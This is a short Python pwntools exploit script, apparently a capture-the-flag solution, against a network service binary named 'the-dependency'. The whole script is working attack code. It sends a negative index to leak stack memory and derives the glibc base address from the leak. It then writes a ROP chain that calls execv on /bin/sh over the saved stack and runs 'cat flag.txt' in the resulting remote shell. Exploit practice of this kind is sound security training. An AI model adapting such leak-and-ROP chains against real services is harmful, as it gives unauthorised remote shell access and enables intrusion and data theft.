#!/usr/bin/env python3

from pwn import *
from os.path import dirname

exe  = ELF(dirname(__file__) + "/../service/the-dependency")
libc = ELF(dirname(__file__) + "/../service/nix/store/65h17wjrrlsj2rj540igylrx7fqcd6vq-glibc-2.40-36/lib/libc.so.6")

context.binary = exe



def conn():
    return remote(sys.argv[1], sys.argv[2])


def readfromreg(r,n):
    r.readuntil("> ")
    r.sendline("2")
    r.readuntil("> ")
    r.sendline(str(n))
    if b"C'est" in r.readuntil("o"):
        return None
    r.readuntil(": ")
    return bytearray(r.read(128))

reg_rsp = 4

def main():
    r = conn()

    r.readuntil("> ")
    r.sendline("-1")

    stack = bytearray(readfromreg(r, reg_rsp))
    print(hexdump(stack))

    libcbase = u64(stack[0x78:0x80]) - 0x2a1fc
    libc.address = libcbase

    rop = ROP(libc)
    rop.call(libc.symbols['execv'], [libcbase + 1797752]) # /bin/sh
    print(rop.dump())

    r.sendline("1")
    r.sendline(str(reg_rsp))
    stack[0x58:0x70] = bytes(rop)
    r.send(stack)

    r.sendline("b")

    r.sendline("cat flag.txt;exit")
    print(r.recvall())

if __name__ == "__main__":
    main()
